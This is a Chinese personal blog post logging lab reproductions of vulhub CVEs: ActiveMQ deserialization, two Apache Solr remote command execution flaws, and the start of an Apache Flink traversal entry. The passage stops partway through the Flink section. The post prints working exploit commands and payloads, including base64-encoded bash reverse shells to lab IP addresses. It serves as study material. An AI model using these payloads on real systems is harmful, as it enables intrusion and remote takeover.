<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="君子坐而论道，少年起而行之">
<meta property="og:type" content="website">
<meta property="og:title" content="liberator">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="liberator">
<meta property="og:description" content="君子坐而论道，少年起而行之">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="liberator">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>liberator</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">liberator</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">天底下没有这样的道理，你不喜欢我，才是正常的</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-link"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="liberator"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">liberator</p>
  <div class="site-description" itemprop="description">君子坐而论道，少年起而行之</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/yyb20040616" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yyb20040616" rel="noopener me" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">vulhub复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-17 11:51:42 / 修改时间：11:52:48" itemprop="dateCreated datePublished" datetime="2023-08-17T11:51:42+08:00">2023-08-17</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:12</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="vulhub复现记录"><a href="#vulhub复现记录" class="headerlink" title="vulhub复现记录"></a>vulhub复现记录</h1><p>借鉴大佬的博客：<a target="_blank" rel="noopener" href="https://drinkflower.asia/">drinkflower的主页</a></p>
<h2 id="CVE-2015-5254（ActiveMQ的反序列化与rce）"><a href="#CVE-2015-5254（ActiveMQ的反序列化与rce）" class="headerlink" title="CVE-2015-5254（ActiveMQ的反序列化与rce）"></a>CVE-2015-5254（ActiveMQ的反序列化与rce）</h2><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A3.png" class>

<p>关于ActiveMQ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ActiveMQ是一个由Apache软件基金会开发的一个开放源代码的纯Java程序式的消息中间件，消息的发送和接收是异步的，在合适的时候发送给接收者</span><br><span class="line"></span><br><span class="line">JMS是java消息服务的应用程序接口，是一个java平台关于面向消息中间件的API，用于进行异步通信。对于端口61616，这是ActiveMQ提供给Java应用程序使用的端口，java应用程序可以使用JMS API连接到ActiveMQ服务器</span><br><span class="line"></span><br><span class="line">端口8161是ActiveMQ的面板控制管理平台，在浏览器访问这个端口，可以查看和管理ActiveMQ的配置、消息接收等等</span><br><span class="line"></span><br><span class="line">ysoserial是一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具</span><br><span class="line"></span><br><span class="line">jmet是一个java写的工具，原理是使用ysoserial生成Payload并发送（其jar包内自带ysoserial，无需自己下载），下载地址为https://github.com/matthiaskaiser/jmet</span><br></pre></td></tr></table></figure>

<p>而本漏洞原理就是远程攻击者可借助特制的序列化Java Message Service的ObjectMessage对象利用该漏洞执行任意代码</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>下载jmet的jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A32.png" class>

<p>在jmet的jar包的保存目录下执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q myevent -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 127.0.0.1（你的目标机的ｉｐ） 61616</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A33.png" class>

<p>上面命令只是向ActiveMQ发送了一个带有恶意的消息，但是并没有被执行，但是因为我们是以管理员登录的，所以直接点击就行，现实情况下应该是需要诱导管理员进行点击的</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A34.png" class>

<p>使用docker exec命令来连接docker的shell,看一下tmp目录有没有sucess文件(-i后面接docker ps查看到的容器id,&#x2F;bin&#x2F;bash是指定终端程序)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker exec -i 9b7e4934b7f1 /bin/bash </span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A35.png" class>

<p>确实有success文件，说明是存在rce的，应该也需要提权，这里就先监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>这里需要将命令进行base64编码，将base64编码并执行的语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>使用在线网站编码反弹shell的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.101/8888 0&gt;&amp;1</span><br><span class="line">IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwMS84ODg4IDA+JjE=</span><br></pre></td></tr></table></figure>

<p>再在kali中使用jmet的rce进行反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,IGJhc2ggLWkgPiYgL2Rldi</span><br><span class="line">90Y3AvMTkyLjE2OC4xLjEwMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.10.129 61616</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A36.png" class>

<p>这时候我们可以在管理面板发现有新消息，点击一下</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A37.png" class>

<p>现在我们发现监听的端口就有了shell，并且直接是root权限</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A38.png" class>

<p>复现成功</p>
<h2 id="CVE-2017-12629（Apache-Solr远程命令执行）"><a href="#CVE-2017-12629（Apache-Solr远程命令执行）" class="headerlink" title="CVE-2017-12629（Apache Solr远程命令执行）"></a>CVE-2017-12629（Apache Solr远程命令执行）</h2><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A3.png" class>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr 是基于 Apache Lucene 构建的一个开源的搜索平台，提供了全文搜索、分析、过滤、排序等功能。它扩展了 Apache Lucene 并提供了更丰富的功能，能够构建复杂的搜索应用程序。在 CVE-2017-12629 漏洞中，Apache Solr 是受影响的组件，由于漏洞的存在，可能导致远程代码执行。</span><br><span class="line"></span><br><span class="line">Lucene 是一个高效的，基于 Java 的全文检索库。 Lucene 是 apache 软件基金会 4 jakarta 项目组的一个子项目，是一个开放源代码的全 文检索引擎工具包，但它不是一个完整的全文检索引擎，而是一个全文检索引擎的架构，Lucene主要提供了一个简单、强大的应用程序接口。在cve-2017-12629漏洞中，Apache Luence是Apache Solr的核心组件之一，用于实现索引和搜索功能</span><br><span class="line"></span><br><span class="line">漏洞利用条件为Apache Solr&lt;7.1，Apache Lucene&lt;7.1</span><br></pre></td></tr></table></figure>

<p>从面板中我们可以得知Apache Solr和Apache Luence两个组件的版本均符合要求</p>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>在Apache Solr中，能够触发命令执行的方式有两种，分别是postCommit和newSearcher</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在 Apache Solr 中，postCommit 和 newSearcher 是与索引操作和搜索操作相关的事件触发器。它们可以用于在索引提交</span><br><span class="line">和搜索查询时执行自定义的操作，包括命令执行，从而可能导致安全漏洞。</span><br><span class="line"></span><br><span class="line">postCommit：postCommit 是一个在索引提交后触发的事件，也就是在索引更新或新增操作完成之后执行的操作。这个事件可</span><br><span class="line">以用于执行一些需要在索引更新后立即处理的任务，比如通知其他系统更新、生成缓存等。然而，如果在 postCommit 中执行</span><br><span class="line">不当操作，如执行恶意命令，就可能导致安全风险。</span><br><span class="line"></span><br><span class="line">newSearcher：newSearcher 是一个在每次 Solr 实例中的搜索器（Searcher）被创建或重新加载时触发的事件。搜索器是</span><br><span class="line">用于执行搜索查询的组件。newSearcher 事件可以用于执行一些在搜索开始之前或之后需要处理的操作，比如更新一些数据、</span><br><span class="line">记录日志等。同样地，如果在 newSearcher 中执行恶意操作，就可能导致安全问题。</span><br><span class="line"></span><br><span class="line">在 CVE-2017-12629 漏洞中，攻击者能够利用 Solr 中的这些事件触发器来执行恶意的远程代码，从而实现命令执行。这是</span><br><span class="line">由于 Solr 没有充分限制对于这些事件触发器的访问权限，导致攻击者可以构造恶意请求来触发这些事件并执行恶意代码，从</span><br><span class="line">而影响服务器的安全性。为了防止这类风险，Solr 的管理员需要进行适当的配置和限制，确保只有受信任的操作可以触发这些</span><br><span class="line">事件。</span><br></pre></td></tr></table></figure>

<p>通过newSearcher进行命令执行的话，一个数据包即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher3&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class="line">&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/miao&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>对于上面这个数据包有一点需要注意的是后面一部分里的name是可以随便取的，并且可重复发包，但是这个name不能重复，一旦重复就会发生报错</strong></p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A32.png" class>

<p>最后一部分就是我们想要执行的命令，这里我们连接容器的shell进去看看文件是否创建成功，也就是命令是否被成功执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i 6545c241717e /bin/bash</span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A33.png" class>

<p>可以看到我们创建成功了，也就是说命令成功执行，那我们下一步就执行反弹shell，先在kali上监听4441端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4441</span><br></pre></td></tr></table></figure>

<p>然后发包(记得改name)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher5&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class="line">&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.10.129/4441 0&gt;&amp;1&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A34.png" class>

<p>这里可以看到数据包上传成功了，但是在我们所监听的端口没有得到回应，试了好几次都失败了，不管了，万一本身就不能弹shell呢，反正证明了这个rce确实是存在的。</p>
<h2 id="CVE-2019-0193（Apache-solr远程命令执行）"><a href="#CVE-2019-0193（Apache-solr远程命令执行）" class="headerlink" title="CVE-2019-0193（Apache solr远程命令执行）"></a>CVE-2019-0193（Apache solr远程命令执行）</h2><p>本次的cve针对的还是solr，和上面的服务是一样的，这里就不再介绍一遍了</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A3.png" class>

<p>我们可以看到，版本升级为了8.1.1，这样子就不符合上一个漏洞的条件了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此漏洞存在于可选模块DataImportHandler中，DataImportHandler是用于从数据库或其他源提取数据的常用模块，该模块中所有DIH配置都可以通过外部请求的dataConfig参数来设置，由于DIH配置可以包含脚本，因此该参数存在安全隐患。攻击者可利用dataConfig参数构造恶意请求，实现远程代码执行。</span><br><span class="line"></span><br><span class="line">漏洞利用条件：Apache solr&lt;8.2.0</span><br></pre></td></tr></table></figure>

<p>根据上面对面板的截图，可以看到这个版本是符合漏洞利用条件的。</p>
<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>这里对于复现的第一步做一个解释，CVE-2019-0193和上面的CVE-2017-12629不一样的是此环境没有自带的core，那什么是core呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在 Apache Solr 中，&quot;core&quot; 是一个重要的概念，它表示了 Solr 实例中的一个独立的、可搜索的索引。每个 Solr 实例可</span><br><span class="line">以包含一个或多个核心（core）。每个核心都代表一个单独的索引，它可以包含特定的数据集、配置和模式。核心使得 Solr</span><br><span class="line">能够同时管理和服务多个独立的搜索需求。</span><br><span class="line"></span><br><span class="line">每个核心都有自己的配置文件、模式定义、数据目录等。不同的核心可以具有不同的配置，从而允许您为不同的数据集和搜索</span><br><span class="line">需求进行不同的设置。</span><br><span class="line"></span><br><span class="line">通过核心的概念，Solr 能够有效地管理和分配系统资源，实现多租户的搜索环境。每个核心可以独立地执行索引、查询和维护</span><br><span class="line">操作，从而提高了系统的灵活性和性能。</span><br><span class="line"></span><br><span class="line">在 Solr 的配置中，您可以通过配置文件（例如 solr.xml）来定义和管理核心。您可以在 Solr 的管理界面中创建、删除、</span><br><span class="line">重载和管理核心，以满足不同的搜索需求。核心是 Solr 集群中的一个基本单元，可以帮助您更好地组织和管理索引和搜索功</span><br><span class="line">能。</span><br></pre></td></tr></table></figure>

<p>所以第一步我们需要创建一个core</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i 4f80f15c3abe /bin/bash</span><br><span class="line">bin/solr create_core -c liberator -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>

<p>先连上镜像内部的shell，后面这一步就创建了一个名为liberator的core</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A32.png" class>

<p>我们将Configuration里面的内容全部替换为我们自己的poc（由exec命令在&#x2F;tmp目录下创建一个success文件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<p>点击Execute with the configuration之后，再由我们连接的镜像内部的shell来看看是否创建成功</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A33.png" class>

<p>可以看到已经创建成功了。</p>
<p>当然我们也可以利用这个漏洞尝试进行反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;/bin/bash &gt;&amp; /dev/tcp/192.168.10.129 4441 0&gt;&amp;1&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>

<p>不知道为啥反弹shell又失败了，但是可以RCE对于漏洞的复现已经完成了</p>
<h2 id="CVE-2020-17519（Apache-Flink目录遍历漏洞）"><a href="#CVE-2020-17519（Apache-Flink目录遍历漏洞）" class="headerlink" title="CVE-2020-17519（Apache Flink目录遍历漏洞）"></a>CVE-2020-17519（Apache Flink目录遍历漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Apache Flink 是一个分布式系统，它需要计算资源来执行应用程序。Flink 集成了所有常见的集群资源管理器，例如 Hadoop YARN、 Apache Mesos和Kubernetes，但同时也可以作为独立集群运行。 </span><br><span class="line"></span><br><span class="line">Flink 被设计为能够很好地工作在上述每个资源管理器中，这是通过资源管理器特定(resource-manager-specific)的部署 模式实现的。Flink 可以采用与当前资源管理器相适应的方式进行交互。  </span><br><span class="line"></span><br><span class="line">部署 Flink 应用程序时，Flink 会根据应用程序配置的并行性自动标识所需的资源，并从资源管理器请求这些资源。在发生 故障的情况下，Flink 通过请求新资源来替换发生故障的容器。提交或控制应用程序的所有通信都是通过 REST 调用进行的 ，这可以简化 Flink 与各种环境中的集成。 </span><br><span class="line"></span><br><span class="line">Apache Flink 1.11.0 中引入的一项更改（也在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。 远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响。 在 Apache Flink 中，JobManager 是 Flink 集群中的一个主要组件，负责调度和协调作业的执行。而 REST 接口是一种通 过 HTTP 协议暴露的接口，用于与 Flink 集群进行交互和管理。 </span><br><span class="line"></span><br><span class="line">JobManager： JobManager 是 Flink 集群的主要控制节点，负责接收作业提交请求、调度任务、分配资源、协调任务执行等。每个 Flink 集群都有一个 JobManager。使用 Flink 的命令行工具或者编程方式与 JobManager 进行交互。命令行工具如flink run可以用来提交作业，而编程方式可以使用 Flink 的客户端 API。 </span><br><span class="line"></span><br><span class="line">REST 接口： Flink 提供了 REST 接口，允许用户和外部系统通过 HTTP 请求与 Flink 集群进行交互。通过 REST 接口，您可以提交作业、查询作业状态、查看集群状态、管理任务等。Flink 的 REST 接口默认在端口 8081 上运行（可以通过配置进行修改）。您可以使用任何支持 HTTP 请求的工具，如 cURL、Postman 或编程语言中的 HTTP 请求库，向 REST 接口发送请求来查询作业状态、查看集群状态等。 简单来说,rest接口在8081端口对外提供api,利用它提供的api可以实现任意文件读取 </span><br><span class="line"></span><br><span class="line">漏洞利用条件为Apache 